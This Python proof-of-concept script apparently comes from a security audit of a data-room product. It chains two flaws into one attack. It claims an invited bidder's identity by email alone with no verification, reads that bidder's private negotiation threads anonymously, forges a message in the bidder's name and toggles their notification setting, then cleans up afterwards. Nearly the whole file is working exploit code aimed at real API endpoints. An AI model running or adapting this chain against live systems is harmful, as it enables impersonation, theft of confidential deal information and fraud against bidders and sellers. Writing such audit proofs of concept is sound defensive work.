#!/usr/bin/env python3
"""CHAIN A — PM-17 -> PM-15. Unauthenticated, no account, no cookie.

On a GROUP data room link at its shipped defaults (emailAuthenticated: false), an
attacker asserts an invited bidder's email in one request and is handed that
bidder's genuine viewerId (PM-17). That viewerId is the credential PM-15's
unauthenticated conversations API accepts, so the attacker then reads, forges, and
mutes that bidder's private negotiation.

Preconditions (seven, per the round-3 review) are checked as controls where
possible. The forged message is deleted and the notification setting restored in
`finally`.

    docker exec -e PYTHONPATH=/opt/poc-deps pm-audit-app \
        python3 /app/security-review/chain-a-bidder-identity-impersonation/poc.py
"""
import re
import sys
import pathlib
import time

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parents[1] / "_poc"))
from pmpoc import (  # noqa: E402
    BASE, db, db_close, get, post, as_json, link_data, table_counts, count_delta,
    VULN, CONTROL, OBSERVE, SKIP, log, summary,
)

# ---- discover a GROUP link whose room has a private thread with a participant --
cand = db("""
  select l.id link, l."dataroomId" room, l."teamId" team, l."emailAuthenticated" ea,
         l."audienceType" aud, l."createdAt" lcreated,
         v.id viewer, v.email, v."createdAt" vcreated, c.id conv
  from "Link" l
  join "Conversation" c on c."dataroomId"=l."dataroomId" and c."visibilityMode"='PRIVATE'
  join "ConversationParticipant" cp on cp."conversationId"=c.id and cp."viewerId" is not null
  join "Viewer" v on v.id=cp."viewerId"
  join "ViewerGroupMembership" gm on gm."viewerId"=v.id
  left join "Message" m on m."conversationId"=c.id
  where l."linkType"='DATAROOM_LINK' and l."audienceType"='GROUP'
    and l."emailAuthenticated"=false
    and v.email !~* '(attacker|evil|selfenrol|xtenant|probe|r1|r2)'
  group by l.id, l."dataroomId", l."teamId", l."emailAuthenticated", l."audienceType",
           l."createdAt", v.id, v.email, v."createdAt", c.id
  having count(m.id) > 0
  order by count(m.id) desc limit 1
""")[0]
LINK, ROOM, TEAM = cand["link"], cand["room"], cand["team"]
TARGET, VICTIM_VIEWER, CONV = cand["email"], cand["viewer"], cand["conv"]
MARK = f"CHAINA-{int(time.time())}"

log(f"CHAIN A — unauthenticated identity assumption   base={BASE}")
log(f"  group link={LINK}  room={ROOM}  target bidder={TARGET}")
log("")

forged_id = None
orig_pref = None
try:
    # ---- A0: discovery from the link URL alone ------------------------------
    ld_status, ld_text, _ = link_data(LINK)
    room_from_url = (re.search(r'"dataroomId":"([^"]+)"', ld_text) or [None, None])[1]
    VULN("the link URL alone yields the dataroomId, unauthenticated",
         ld_status == 200 and room_from_url == ROOM, f"dataroomId={room_from_url}")

    # ---- ground truth (from the database) -----------------------------------
    CONTROL("the target is a genuine invited group member",
            bool(db('select 1 from "ViewerGroupMembership" where "viewerId"=$1', [VICTIM_VIEWER])))
    CONTROL("the link is GROUP with emailAuthenticated=false (the shipped default)",
            cand["aud"] == "GROUP" and cand["ea"] is False)

    # ---- A1: the gate refuses a stranger ------------------------------------
    def enter(email):
        return post("/api/views-dataroom", {
            "linkId": LINK, "dataroomId": ROOM, "email": email, "userId": None,
            "linkType": "DATAROOM_LINK", "viewType": "DATAROOM_VIEW",
            "hasConfirmedAgreement": False,
        })
    s_status, _, _ = enter(f"nobody-{int(time.time())}@not-invited.test")
    CONTROL("a stranger address is refused entry", s_status == 403, f"HTTP {s_status}")

    # ---- A2 (PM-17): assume the bidder's identity in one request ------------
    r_status, r_text, _ = enter(TARGET)
    ident = as_json(r_text)
    VULN("entry is granted on a self-asserted address, with no verification",
         r_status == 200 and bool(ident.get("viewId")), f"HTTP {r_status}")
    VULN("the response returns the GENUINE bidder's canonical viewerId",
         ident.get("viewerId") == VICTIM_VIEWER,
         f"returned {ident.get('viewerId')} == ground truth {VICTIM_VIEWER}")
    OBSERVE("this step is loud", "it records a View and notifies the seller (attributed to the bidder)")

    # ---- A3 (PM-15): read the bidder's private threads, anonymously ---------
    before = table_counts()
    c_status, c_text, _ = get(f"/api/conversations?dataroomId={ROOM}&viewerId={ident.get('viewerId')}")
    convos = as_json(c_text)
    lst = convos if isinstance(convos, list) else []
    priv = [c for c in lst if c.get("visibilityMode") == "PRIVATE"]
    bodies = [m for c in priv for m in (c.get("messages") or [])]
    preexisting = [m for m in bodies if not str(m.get("content", "")).startswith("CHAINA-")]
    for c in priv:
        log(f"      \"{c.get('title')}\" [{c.get('visibilityMode')}]")
        for m in (c.get("messages") or [])[:3]:
            log(f"        > {str(m.get('content',''))[:80]}")
    VULN("an unauthenticated caller reads the bidder's PRIVATE thread",
         c_status == 200 and len(priv) > 0 and len(preexisting) > 0,
         f"{len(priv)} PRIVATE thread(s), {len(preexisting)} pre-existing message(s)")
    after = table_counts()
    delta = count_delta(before, after)
    VULN("the read leaves no trace anywhere in the schema",
         len(delta) == 0, "0 row changes" if not delta else str(delta))

    # ---- A4 (PM-15): forge a message as the bidder --------------------------
    content = f"{MARK}: we are prepared to raise our offer."
    post("/api/conversations/messages",
         {"conversationId": CONV, "viewerId": ident.get("viewerId"), "content": content})
    rows = db('select id, "viewerId", "userId" from "Message" where content=$1', [content])
    forged = rows[0] if rows else None
    forged_id = forged["id"] if forged else None
    VULN("an anonymous message is stored in the victim's private thread, attributed to the bidder",
         bool(forged) and forged["viewerId"] == VICTIM_VIEWER and forged["userId"] is None,
         forged_id or "no row")

    # ---- A5 (PM-15): mute the bidder ----------------------------------------
    def pref():
        r = db('select "receiveNotifications" rn from "ConversationParticipant" '
               'where "conversationId"=$1 and "viewerId"=$2', [CONV, VICTIM_VIEWER])
        return r[0]["rn"] if r else None
    orig_pref = pref()
    post("/api/conversations/notifications",
         {"conversationId": CONV, "viewerId": ident.get("viewerId"), "enabled": not orig_pref})
    flipped = pref()
    post("/api/conversations/notifications",
         {"conversationId": CONV, "viewerId": ident.get("viewerId"), "enabled": orig_pref})
    VULN("an anonymous caller writes the bidder's notification setting",
         flipped == (not orig_pref) and pref() == orig_pref,
         f"flipped and restored (original={orig_pref})")

    SKIP("60-probe enumeration", "not re-run to avoid flooding the seller's notifications; "
         "round 3 measured 60 probes, one IP, 104s, zero 429s on the deny path")
finally:
    if forged_id:
        db('delete from "Message" where id=$1', [forged_id])
    if orig_pref is not None:
        db('update "ConversationParticipant" set "receiveNotifications"=$3 '
           'where "conversationId"=$1 and "viewerId"=$2', [CONV, VICTIM_VIEWER, orig_pref])
    log("")
    log("  cleanup: forged message deleted; notification setting restored")

summary(f"CHAIN A — bidder identity impersonation  ({MARK})")
db_close()
